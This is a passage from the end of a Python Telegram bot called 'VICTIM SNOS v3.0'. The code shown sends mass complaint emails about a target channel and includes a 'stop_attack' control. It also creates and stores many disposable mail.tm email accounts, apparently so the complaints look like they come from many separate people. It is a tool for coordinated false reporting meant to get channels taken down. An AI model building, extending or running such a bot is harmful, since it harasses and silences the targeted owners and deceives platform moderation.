    status_msg = await message.answer("<b>Отправка жалоб...</b>")
    sent = await send_mass_complaint_channel(mail_tm, channel)
    
    await status_msg.delete()
    await message.answer(
        f"<b>ГОТОВО!</b>\n\nКанал: {channel}\nОтправлено писем: {sent}",
        reply_markup=get_main_menu()
    )

@dp.callback_query(F.data == "stop_attack")
async def stop_attack(callback: types.CallbackQuery):
    await callback.message.edit_text("<b>Остановлено</b>", reply_markup=get_main_menu())
    await callback.answer()

# ---------- ЗАПУСК ----------
mail_tm = MailTM()

async def init_mailtm_background():
    """Фоновая инициализация mail.tm"""
    try:
        with open('mailtm_accounts.json', 'r') as f:
            mail_tm.accounts = json.load(f)
            mail_tm.ready = True
            logger.info(f"Загружено {len(mail_tm.accounts)} mail.tm аккаунтов из файла")
    except:
        logger.info("Создание новых mail.tm аккаунтов...")
        await mail_tm.create_multiple_accounts(MAILTM_ACCOUNTS_COUNT)
        if mail_tm.accounts:
            with open('mailtm_accounts.json', 'w') as f:
                json.dump(mail_tm.accounts, f)

async def main():
    logger.info("VICTIM SNOS v3.0 запуск...")
    
    await bot.delete_webhook(drop_pending_updates=True)
    
    # Запускаем фоновые задачи
    asyncio.create_task(init_sessions_background())
    asyncio.create_task(init_mailtm_background())
    
    logger.info("Бот запущен!")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
